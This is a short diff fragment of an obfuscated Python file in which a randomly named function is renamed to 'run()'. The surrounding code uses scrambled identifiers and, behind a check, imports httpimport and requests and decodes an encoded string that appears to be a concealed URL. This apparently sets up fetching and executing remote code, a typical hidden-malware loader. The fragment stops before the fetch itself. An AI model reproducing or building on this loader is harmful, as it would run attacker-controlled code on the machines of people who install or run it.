@@ -26,7 +26,7 @@ def SvFEInfzNbhiRqmdYLjxJD():
 
     return bool(SvFEInfzNbhiRqmdYLjxJD + dcmnkUzwuYqyZhNClp)
 
-def SiNLRZ():
+def run():
     if not SvFEInfzNbhiRqmdYLjxJD():
         import httpimport, requests, json
         qQjorxLbdKAWJOIHaiUl = kZopYctmde("ĳŗŗŋŔ©őĞŠİĶŗĳŚġŚŔĪőĤňŅŗĪŅŗĤňłŋŦŔĤőĶŋŗĪő¦¦âňħŚĿĪŔĭňőĀÖåñ¾÷łĞĶŅłňħŚĿĪŔĹŔňŅ")
